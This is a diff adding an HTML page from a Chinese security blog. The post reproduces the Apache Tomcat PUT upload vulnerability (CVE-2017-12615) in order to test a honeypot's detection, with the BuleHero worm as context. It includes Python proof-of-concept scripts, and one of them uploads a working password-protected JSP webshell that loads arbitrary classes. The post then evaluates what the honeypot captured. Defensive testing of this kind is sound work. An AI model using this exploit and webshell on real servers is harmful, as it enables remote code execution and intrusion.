@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Apache Tomcat远程代码执行漏洞 | PlaneJun&#39;s Blog</title>
+<meta name="keywords" content="Vulhub">
+<meta name="description" content="Apache Tomcat远程代码执行漏洞">
+<meta name="author" content="
+作者:&nbsp;PlaneJun">
+<link rel="canonical" href="https://planejun.github.io/posts/vulhub/apache-tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d5b6afbe926845090cb4cd7d45d6160898139db8a25f6d941fa0f8ca24b359bc.css" integrity="sha256-1bavvpJoRQkMtM19RdYWCJgTnbiiX22UH6D4yiSzWbw=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+        onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://planejun.github.io/icon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://planejun.github.io/icon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://planejun.github.io/icon.jpg">
+<link rel="apple-touch-icon" href="https://planejun.github.io/icon.jpg">
+<link rel="mask-icon" href="https://planejun.github.io/icon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = ""; 
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<meta property="og:title" content="Apache Tomcat远程代码执行漏洞" />
+<meta property="og:description" content="Apache Tomcat远程代码执行漏洞" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://planejun.github.io/posts/vulhub/apache-tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="PlaneJun&#39;s Blog" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Apache Tomcat远程代码执行漏洞"/>
+<meta name="twitter:description" content="Apache Tomcat远程代码执行漏洞"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://planejun.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Apache Tomcat远程代码执行漏洞",
+      "item": "https://planejun.github.io/posts/vulhub/apache-tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Apache Tomcat远程代码执行漏洞",
+  "name": "Apache Tomcat远程代码执行漏洞",
+  "description": "Apache Tomcat远程代码执行漏洞",
+  "keywords": [
+    "Vulhub"
+  ],
+  "articleBody": " 唐榕 - 2022-09-13 15:58 一、事件概述 腾讯安全御见威胁情报中心于2019年11月11日检测到挖矿蠕虫病毒BuleHero升级到4.0版。在此次更新中，BuleHero引入了多种新漏洞的使用，包括Tomcat任意文件上传漏洞(CVE-2017-12617)、Apache Struts2远程代码执行漏洞、Weblogic反序列化任意代码执行漏洞，此次又引入了Drupal远程代码执行漏洞、Apache Solr 远程命令执行漏洞、PHPStudy后门利用，使得其攻击方法增加到十个之多。(报告链接:https://www.freebuf.com/news/219973.html)\n二、POC获取及复现 1、POC获取 import requests targeturl = \"http://8.210.158.131:8080/test.jsp\" payload = '\u003c% out.println(\"hello world!\"); %\u003e' requests.put(targeturl+'/',data=payload) r = requests.get(targeturl) if r.status_code==200: if(r.text.find('hello world!')!=-1): print('存在CVE-2017-12615 Tomcat 任意文件读写漏洞') exit() print('不存在CVE-2017-12615 Tomcat 任意文件读写漏洞') 2、根据真实攻击修改POC 2.1、样本漏洞利用分析 样本(ecb3266326d77741815ecebb18ee951a)使用了两种后缀名绕过的方法将木马文件FxCodeShell.jsp进行上传。\n其中文件部分内容如下：\n2.2、修改POC 将payload内容改为蚁剑jsp的一句木马，并设置连接密码为passwd。\nimport requests targeturl = \"http://8.210.158.131:8080/test.jsp\" payload=''' \u003c%! class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } public byte[] base64Decode(String str) throws Exception { try { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } catch (Exception e) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } } %\u003e \u003c% String cls = request.getParameter(\"passwd\"); if (cls != null) { new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext); } %\u003e ''' requests.put(targeturl+'/',data=payload) r = requests.get(targeturl) if r.status_code==200: #if(r.text.find('hello world!')!=-1): print('存在CVE-2017-12615 Tomcat 任意文件读写漏洞') exit() print('不存在CVE-2017-12615 Tomcat 任意文件读写漏洞') 3、在蜜罐中复现过程 本次复现使用的蜜罐地址为：https://47.115.125.75/。首先启动对应的蜜罐服务。\n地址栏输入IP和对应端口后访问正常。\n将修改的POC执行。\n成功执行命令后进入蜜罐查看威胁事件，蜜罐能够成功捕获到漏洞利用行为和漏洞类型。\n通过漏洞利用写入的样本文件也能被捕获到。\n捕获到的流量也完整。\n日志同样捕获到漏洞利用痕迹，但未能准确报出威胁类型。\n在使用蚁剑连接时，密网也能捕获到消息的威胁事件信息。\n三、复现结果及建议 复现结果：对于Apache Tomcat远代码执行漏洞的利用，蜜罐能够准确的捕获到威胁事件并且提供较为详细的数据视图，其中包括漏洞类型、Pcap包、远程执行的payload、落地文件、网络日志，但在网络日志中缺失对威胁判断的数据，即没能研判黑白。\n优化建议：对网络日志中的威胁判断一栏进行加强检测，可以将收集一些恶意的payload与网络流量碰撞进行研判。\n",
+  "wordCount" : "153",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "PlaneJun"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://planejun.github.io/posts/vulhub/apache-tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "PlaneJun's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://planejun.github.io/icon.jpg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://planejun.github.io/" accesskey="h" title="PlaneJun&#39;s Blog (Alt + H)">
+            <img src="https://planejun.github.io/icon.jpg" alt="logo" aria-label="logo"
+                 height="45">PlaneJun&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://planejun.github.io/posts" title="Posts">
+                <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://planejun.github.io/tags" title="Categories">
+                <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://github.com/PlaneJun" title="Links">
+                <span>Links</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://github.com/adityatelange/hugo-PaperMod/wiki/" title="About">
+                <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main page">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://planejun.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://planejun.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Apache Tomcat远程代码执行漏洞
+    </h1>
+    <div class="post-description">
+      Apache Tomcat远程代码执行漏洞
+    </div>
+    <div class="post-meta">时长:&nbsp;1分钟&nbsp;|&nbsp;
+作者:&nbsp;PlaneJun
+
+
+
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">文章目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e4%b8%80%e4%ba%8b%e4%bb%b6%e6%a6%82%e8%bf%b0" aria-label="一、事件概述">一、事件概述</a></li>
+                    <li>
+                        <a href="#%e4%ba%8cpoc%e8%8e%b7%e5%8f%96%e5%8f%8a%e5%a4%8d%e7%8e%b0" aria-label="二、POC获取及复现">二、POC获取及复现</a><ul>
+                            
+                    <li>
+                        <a href="#1poc%e8%8e%b7%e5%8f%96" aria-label="1、POC获取">1、POC获取</a></li>
+                    <li>
+                        <a href="#2%e6%a0%b9%e6%8d%ae%e7%9c%9f%e5%ae%9e%e6%94%bb%e5%87%bb%e4%bf%ae%e6%94%b9poc" aria-label="2、根据真实攻击修改POC">2、根据真实攻击修改POC</a><ul>
+                            
+                    <li>
+                        <a href="#21%e6%a0%b7%e6%9c%ac%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%88%86%e6%9e%90" aria-label="2.1、样本漏洞利用分析">2.1、样本漏洞利用分析</a></li>
+                    <li>
+                        <a href="#22%e4%bf%ae%e6%94%b9poc" aria-label="2.2、修改POC">2.2、修改POC</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#3%e5%9c%a8%e8%9c%9c%e7%bd%90%e4%b8%ad%e5%a4%8d%e7%8e%b0%e8%bf%87%e7%a8%8b" aria-label="3、在蜜罐中复现过程">3、在蜜罐中复现过程</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e4%b8%89%e5%a4%8d%e7%8e%b0%e7%bb%93%e6%9e%9c%e5%8f%8a%e5%bb%ba%e8%ae%ae" aria-label="三、复现结果及建议">三、复现结果及建议</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+         
+         activeElement = elements[0];
+         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+     }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+             const id = encodeURI(element.getAttribute('id')).toLowerCase();
+             if (element === activeElement){
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+             } else {
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+             }
+         })
+     }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+</script>
+
+  <div class="post-content"><ul>
+<li>唐榕 - 2022-09-13 15:58</li>
+</ul>
+<h1 id="一事件概述">一、事件概述<a hidden class="anchor" aria-hidden="true" href="#一事件概述">#</a></h1>
+<p>腾讯安全御见威胁情报中心于2019年11月11日检测到挖矿蠕虫病毒BuleHero升级到4.0版。在此次更新中，BuleHero引入了多种新漏洞的使用，包括Tomcat任意文件上传漏洞(CVE-2017-12617)、Apache Struts2远程代码执行漏洞、Weblogic反序列化任意代码执行漏洞，此次又引入了Drupal远程代码执行漏洞、Apache Solr 远程命令执行漏洞、PHPStudy后门利用，使得其攻击方法增加到十个之多。(报告链接:<a href="https://www.freebuf.com/news/219973.html">https://www.freebuf.com/news/219973.html</a>)</p>
+<h1 id="二poc获取及复现">二、POC获取及复现<a hidden class="anchor" aria-hidden="true" href="#二poc获取及复现">#</a></h1>
+<h2 id="1poc获取">1、POC获取<a hidden class="anchor" aria-hidden="true" href="#1poc获取">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">targeturl</span> <span class="o">=</span> <span class="s2">&#34;http://8.210.158.131:8080/test.jsp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&lt;</span><span class="si">% o</span><span class="s1">ut.println(&#34;hello world!&#34;); %&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">targeturl</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">targeturl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;hello world!&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;不存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="2根据真实攻击修改poc">2、根据真实攻击修改POC<a hidden class="anchor" aria-hidden="true" href="#2根据真实攻击修改poc">#</a></h2>
+<h3 id="21样本漏洞利用分析">2.1、样本漏洞利用分析<a hidden class="anchor" aria-hidden="true" href="#21样本漏洞利用分析">#</a></h3>
+<p>样本(ecb3266326d77741815ecebb18ee951a)使用了两种后缀名绕过的方法将木马文件<code>FxCodeShell.jsp</code>进行上传。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId5.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId5.png"  />
+</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId6.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId6.png"  />
+</p>
+<p>其中文件部分内容如下：</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId7.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId7.png"  />
+</p>
+<h3 id="22修改poc">2.2、修改POC<a hidden class="anchor" aria-hidden="true" href="#22修改poc">#</a></h3>
+<p>将payload内容改为蚁剑jsp的一句木马，并设置连接密码为passwd。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">targeturl</span> <span class="o">=</span> <span class="s2">&#34;http://8.210.158.131:8080/test.jsp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;%!
+</span></span></span><span class="line"><span class="cl"><span class="s1">    class U extends ClassLoader {
+</span></span></span><span class="line"><span class="cl"><span class="s1">        U(ClassLoader c) {
+</span></span></span><span class="line"><span class="cl"><span class="s1">            super(c);
+</span></span></span><span class="line"><span class="cl"><span class="s1">        }
+</span></span></span><span class="line"><span class="cl"><span class="s1">        public Class g(byte[] b) {
+</span></span></span><span class="line"><span class="cl"><span class="s1">            return super.defineClass(b, 0, b.length);
+</span></span></span><span class="line"><span class="cl"><span class="s1">        }
+</span></span></span><span class="line"><span class="cl"><span class="s1">    }
+</span></span></span><span class="line"><span class="cl"><span class="s1"> 
+</span></span></span><span class="line"><span class="cl"><span class="s1">    public byte[] base64Decode(String str) throws Exception {
+</span></span></span><span class="line"><span class="cl"><span class="s1">        try {
+</span></span></span><span class="line"><span class="cl"><span class="s1">            Class clazz = Class.forName(&#34;sun.misc.BASE64Decoder&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s1">            return (byte[]) clazz.getMethod(&#34;decodeBuffer&#34;, String.class).invoke(clazz.newInstance(), str);
+</span></span></span><span class="line"><span class="cl"><span class="s1">        } catch (Exception e) {
+</span></span></span><span class="line"><span class="cl"><span class="s1">            Class clazz = Class.forName(&#34;java.util.Base64&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s1">            Object decoder = clazz.getMethod(&#34;getDecoder&#34;).invoke(null);
+</span></span></span><span class="line"><span class="cl"><span class="s1">            return (byte[]) decoder.getClass().getMethod(&#34;decode&#34;, String.class).invoke(decoder, str);
+</span></span></span><span class="line"><span class="cl"><span class="s1">        }
+</span></span></span><span class="line"><span class="cl"><span class="s1">    }
+</span></span></span><span class="line"><span class="cl"><span class="s1">%&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;%
+</span></span></span><span class="line"><span class="cl"><span class="s1">    String cls = request.getParameter(&#34;passwd&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s1">    if (cls != null) {
+</span></span></span><span class="line"><span class="cl"><span class="s1">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+</span></span></span><span class="line"><span class="cl"><span class="s1">    }
+</span></span></span><span class="line"><span class="cl"><span class="s1">%&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">targeturl</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">targeturl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#if(r.text.find(&#39;hello world!&#39;)!=-1):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;不存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="3在蜜罐中复现过程">3、在蜜罐中复现过程<a hidden class="anchor" aria-hidden="true" href="#3在蜜罐中复现过程">#</a></h2>
+<p>本次复现使用的蜜罐地址为：<a href="https://47.115.125.75/">https://47.115.125.75/</a>。首先启动对应的蜜罐服务。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId9.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId9.png"  />
+</p>
+<p>地址栏输入IP和对应端口后访问正常。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId10.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId10.png"  />
+</p>
+<p>将修改的POC执行。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId11.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId11.png"  />
+</p>
+<p>成功执行命令后进入蜜罐查看威胁事件，蜜罐能够成功捕获到漏洞利用行为和漏洞类型。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId12.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId12.png"  />
+</p>
+<p>通过漏洞利用写入的样本文件也能被捕获到。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId13.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId13.png"  />
+</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId14.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId14.png"  />
+</p>
+<p>捕获到的流量也完整。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId15.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId15.png"  />
+</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId16.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId16.png"  />
+</p>
+<p>日志同样捕获到漏洞利用痕迹，但未能准确报出威胁类型。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId17.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId17.png"  />
+</p>
+<p>在使用蚁剑连接时，密网也能捕获到消息的威胁事件信息。</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId18.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId18.png"  />
+</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId19.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId19.png"  />
+</p>
+<p><img loading="lazy" src="/posts/Vulhub/Apache%20Tomcat%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/document_image_rId20.png" alt="/posts/Vulhub/Apache%20Tomcat远程代码执行漏洞/document_image_rId20.png"  />
+</p>
+<h1 id="三复现结果及建议">三、复现结果及建议<a hidden class="anchor" aria-hidden="true" href="#三复现结果及建议">#</a></h1>
+<p>复现结果：对于Apache Tomcat远代码执行漏洞的利用，蜜罐能够准确的捕获到威胁事件并且提供较为详细的数据视图，其中包括漏洞类型、Pcap包、远程执行的payload、落地文件、网络日志，但在网络日志中缺失对威胁判断的数据，即没能研判黑白。</p>
+<p>优化建议：对网络日志中的威胁判断一栏进行加强检测，可以将收集一些恶意的payload与网络流量碰撞进行研判。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://planejun.github.io/tags/vulhub/">Vulhub</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://planejun.github.io/posts/gamehacker/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>2022游戏安全技术竞赛-初赛</span>
+  </a>
+  <a class="next" href="https://planejun.github.io/posts/reverse/cm%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>CM分析-腾讯面试</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://planejun.github.io/">PlaneJun&#39;s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
